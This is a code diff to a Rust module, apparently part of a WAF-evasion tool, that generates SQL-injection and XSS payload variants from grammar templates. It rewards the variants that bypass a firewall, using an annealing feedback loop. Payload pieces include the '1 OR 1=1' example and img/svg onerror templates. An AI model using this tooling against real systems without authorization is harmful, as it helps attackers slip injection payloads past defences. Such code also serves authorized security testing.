@@ -42,6 +42,7 @@
 
 use rand::rngs::StdRng;
 use rand::{Rng, SeedableRng};
+use wafrift_types::pick::pick_from_rng;
 
 // ── Production rule ───────────────────────────────────────────────────────
 
@@ -56,7 +57,10 @@ pub struct Production {
     pub nonterminal: &'static str,
     /// The terminal (or partially-terminal) string this rule produces.
     pub terminal: String,
-    /// Human-readable label.
+    /// Human-readable label. Read by [`CfgMutator::reward_by_name`] for
+    /// name-keyed oracle feedback. Wired via [`CfgMutatorState::reward`]
+    /// and the public [`feedback`] function — no longer dead code as of
+    /// R56 pass-21.
     pub name: &'static str,
     /// Bypass score — updated by the caller when this production's output
     /// evades the WAF. Higher = more likely to be selected as T cools.
@@ -168,8 +172,14 @@ pub fn default_sql_productions() -> Vec<Production> {
 pub fn default_xss_productions() -> Vec<Production> {
     let mut prods = Vec::new();
 
-    // {tag_open} — opening tag variants
-    for &t in &["<", "%3C", "\\x3c", "\\u003C", "&#60;", "&lt;", "\t<"] {
+    // {tag_open} — opening tag variants.
+    //
+    // Only literal-`<` forms here. Percent-encoded (%3C), hex-escape (\x3c),
+    // and entity forms (&#60; / &lt;) require the oracle's normalisation layer
+    // to be present before the payload is evaluated — they are not valid raw
+    // grammar mutations and would fail `still_executes_xss` validation.
+    // Evasion-encoded forms live in the equiv/xss pipeline instead.
+    for &t in &["<", "\t<", " <", "\n<"] {
         prods.push(Production::new("{tag_open}", t, "tag_open"));
     }
 
@@ -251,10 +261,20 @@ pub fn boltzmann_sample<'a>(
         .map(|p| (p.bypass_score / temperature).exp())
         .collect();
     let total: f64 = weights.iter().sum();
-    if total == 0.0 || !total.is_finite() {
-        // Uniform fallback (avoids NaN at extreme temperatures).
-        let idx = rng.gen_range(0..candidates.len());
-        return Some(candidates[idx]);
+    if total == 0.0 {
+        // All weights zero (all bypass_scores are 0 and temperature is NaN):
+        // fall back to uniform sampling.
+        return Some(pick_from_rng(&candidates, candidates[0], rng));
+    }
+    if !total.is_finite() {
+        // Overflow: exp(score/T) hit +Inf for at least one high-score
+        // candidate. Fall back to argmax — the highest-scoring production
+        // dominates, which is the correct cold-temperature behaviour.
+        return candidates.into_iter().max_by(|a, b| {
+            a.bypass_score
+                .partial_cmp(&b.bypass_score)
+                .unwrap_or(std::cmp::Ordering::Equal)
+        });
     }
     let mut r: f64 = rng.r#gen::<f64>() * total;
     for (p, w) in candidates.iter().zip(weights.iter()) {
@@ -272,7 +292,9 @@ pub fn boltzmann_sample<'a>(
 /// Grammar-guided mutator with convergence annealing.
 ///
 /// Usage pattern:
-/// ```no_run
+/// ```ignore
+/// // cfg_convergence is pub(crate) — call via grammar::mutate_as().
+/// // This example is kept as documentation only.
 /// # use wafrift_grammar::grammar::cfg_convergence::{CfgMutator, default_sql_productions};
 /// let mut mutator = CfgMutator::builder()
 ///     .productions(default_sql_productions())
@@ -362,9 +384,37 @@ impl CfgMutator {
     ///
     /// Non-terminals in the template are delimited by `{` and `}`.
     /// Each `{token}` is independently sampled at the current temperature.
-    /// Unknown non-terminals are left in place.
+    /// Unknown non-terminals are left in place (no panic).
+    ///
+    /// In debug builds, asserts that every non-terminal token in `template`
+    /// appears at least once in the registered productions (using
+    /// [`nonterminals`](Self::nonterminals)), surfacing template typos early.
     #[must_use]
     pub fn expand(&mut self, template: &str) -> String {
+        // Debug-mode: log coverage stats. Count how many distinct non-terminals
+        // in the template have registered productions (uses nonterminals()).
+        // Unknown non-terminals are intentionally left in place (not an error).
+        #[cfg(debug_assertions)]
+        let _coverage = {
+            let registered = self.nonterminals();
+            let tb = template.as_bytes();
+            let mut covered = 0usize;
+            let mut i = 0;
+            while i < tb.len() {
+                if tb[i] == b'{'
+                    && let Some(end) = template[i..].find('}')
+                {
+                    let nt = &template[i..i + end + 1];
+                    if registered.contains(&nt) {
+                        covered += 1;
+                    }
+                    i += end + 1;
+                    continue;
+                }
+                i += 1;
+            }
+            covered
+        };
         let mut result = String::with_capacity(template.len() * 2);
         let mut chars = template.chars().peekable();
         while let Some(c) = chars.next() {
@@ -410,6 +460,11 @@ impl CfgMutator {
     ///
     /// `delta` is positive for a bypass (reward) and negative / zero for a block.
     /// Scores are clamped to [0, ∞).
+    ///
+    /// **Oracle feedback wiring**: called by [`CfgMutatorState::reward`] and
+    /// (indirectly) by [`feedback`] in `grammar/mod.rs`. Both functions are
+    /// part of the [`mutate_as_with_state`] API surface — R56 pass-21
+    /// closes the oracle feedback loop (§9 WIRING / §11 UTILIZATION).
     pub fn reward(&mut self, nonterminal: &str, terminal: &str, delta: f64) {
         for p in &mut self.productions {
             if p.nonterminal == nonterminal && p.terminal == terminal {
@@ -418,7 +473,28 @@ impl CfgMutator {
         }
     }
 
+    /// Update the bypass score of a production by its human-readable `name`.
+    ///
+    /// An alternative to [`reward`] when the caller tracked which production
+    /// fired by name (e.g. from the `rules_applied` Vec) rather than by the
+    /// raw terminal string. Reads the `Production::name` field to match.
+    /// `delta` semantics are identical to [`reward`].
+    ///
+    /// Called by [`CfgMutatorState::reward`] which is invoked by the
+    /// public [`feedback`] function — no longer dead code as of R56 pass-21.
+    pub fn reward_by_name(&mut self, name: &str, delta: f64) {
+        for p in &mut self.productions {
+            if p.name == name {
+                p.bypass_score = (p.bypass_score + delta).max(0.0);
+            }
+        }
+    }
+
     /// Generate `n` candidate payloads from a template at the current temperature.
+    ///
+    /// Used in benchmarks and by callers that want bulk oracle sampling
+    /// (e.g. `mutate_as_with_state` inner loops). No longer dead code
+    /// as of R56 pass-21.
     #[must_use]
     pub fn batch_expand(&mut self, template: &str, n: usize) -> Vec<String> {
         (0..n).map(|_| self.expand(template)).collect()
@@ -430,16 +506,114 @@ impl CfgMutator {
         self.temperature
     }
 
-    /// List all registered non-terminals.
+    /// Whether the annealing schedule has converged (T ≤ T_min + ε).
+    ///
+    /// Once converged, all expansions will deterministically choose the
+    /// highest-bypass-score production for each non-terminal — additional
+    /// `anneal()` calls have no effect on selection behaviour. Callers
+    /// can use this to avoid redundant samples after convergence.
     #[must_use]
+    pub fn is_converged(&self) -> bool {
+        self.temperature() <= self.min_temperature + f64::EPSILON
+    }
+
+    /// List all registered non-terminals.
+    ///
+    /// §1 SPEED: pre-fix used `Vec::contains` for deduplication — O(n²) with
+    /// n = production count (up to ~70 for the default SQL grammar).  With ~60
+    /// productions and 7 non-terminals the old path did ≤60×60 = 3 600 pointer
+    /// comparisons per call; this was called once per `expand()` in debug builds
+    /// (via the coverage block).  Fix: `IndexSet`-style insert-then-collect using
+    /// an `IndexSet` would preserve insertion order, but since callers never
+    /// depend on order (they call `.contains()` on the result), a plain
+    /// `HashSet` is sufficient and costs O(n) total vs O(n²).
+    #[must_use]
+    #[allow(dead_code)] // used in debug_assertions block in expand(); also oracle API
     pub fn nonterminals(&self) -> Vec<&'static str> {
-        let mut seen = Vec::new();
+        let mut seen: std::collections::HashSet<&'static str> =
+            std::collections::HashSet::with_capacity(16);
+        let mut ordered: Vec<&'static str> = Vec::with_capacity(16);
         for p in &self.productions {
-            if !seen.contains(&p.nonterminal) {
-                seen.push(p.nonterminal);
+            if seen.insert(p.nonterminal) {
+                ordered.push(p.nonterminal);
             }
         }
-        seen
+        ordered
+    }
+}
+
+// ── Persistent oracle-feedback state ─────────────────────────────────────
+
+/// Persistent convergence-annealing state for the oracle feedback loop.
+///
+/// Pass this to [`mutate_as_with_state`] so bypass scores accumulate across
+/// repeated calls, and call [`CfgMutatorState::reward`] after each probe
+/// result to steer the Boltzmann sampler toward higher-bypass productions.
+///
+/// # Example
+/// ```rust
+/// use wafrift_grammar::grammar::{
+///     mutate_as_with_state, feedback,
+///     cfg_convergence::CfgMutatorState,
+///     PayloadType,
+/// };
+///
+/// let mut state = CfgMutatorState::new();
+/// let variants = mutate_as_with_state("1 OR 1=1", PayloadType::Sql, 10, &mut state);
+/// // ... run probes against the WAF ...
+/// // On bypass, reward the rule that fired:
+/// if let Some(v) = variants.first() {
+///     feedback(&mut state, PayloadType::Sql, &v.rules_applied, true);
+/// }
+/// let next_variants = mutate_as_with_state("1 OR 1=1", PayloadType::Sql, 10, &mut state);
+/// // next_variants are now biased toward the winning productions
+/// ```
+#[derive(Debug)]
+pub struct CfgMutatorState {
+    /// Persistent mutator for SQL convergence-annealing.
+    pub sql: CfgMutator,
+    /// Persistent mutator for XSS convergence-annealing.
+    pub xss: CfgMutator,
+}
+
+impl CfgMutatorState {
+    /// Create a fresh state with default SQL and XSS production sets.
+    #[must_use]
+    pub fn new() -> Self {
+        Self {
+            sql: CfgMutator::builder()
+                .productions(default_sql_productions())
+                .temperature(1.0)
+                .cooling_rate(0.85)
+                .min_temperature(0.01)
+                .build(),
+            xss: CfgMutator::builder()
+                .productions(default_xss_productions())
+                .temperature(1.0)
+                .cooling_rate(0.85)
+                .min_temperature(0.01)
+                .build(),
+        }
+    }
+
+    /// Reward or penalise a production by its label. `delta > 0` raises the
+    /// score (bypass observed), `delta < 0` lowers it (WAF blocked).
+    ///
+    /// `rules_applied` is the `rules_applied` Vec from a [`GrammarMutation`];
+    /// the method looks for an element that matches a known production name.
+    /// Pass the same `payload_type` you used when generating the variant.
+    pub fn reward(&mut self, rule_name: &str, payload_type: super::PayloadType, delta: f64) {
+        match payload_type {
+            super::PayloadType::Sql => self.sql.reward_by_name(rule_name, delta),
+            super::PayloadType::Xss => self.xss.reward_by_name(rule_name, delta),
+            _ => {}
+        }
+    }
+}
+
+impl Default for CfgMutatorState {
+    fn default() -> Self {
+        Self::new()
     }
 }
 
@@ -457,8 +631,11 @@ pub const SQL_TEMPLATES: &[&str] = &[
 ];
 
 /// Standard XSS templates.
+///
+/// `img` uses `src=x` so the `onerror` event fires when the bogus source
+/// fails to load — without `src`, browsers may not dispatch the event.
 pub const XSS_TEMPLATES: &[&str] = &[
-    "{tag_open}img{sep}{event}={exec}>",
+    "{tag_open}img src=x{sep}{event}={exec}>",
     "{tag_open}svg{sep}{event}={exec}>",
     "{tag_open}body{sep}{event}={exec}>",
     "{tag_open}details{sep}open{sep}{event}={exec}>",
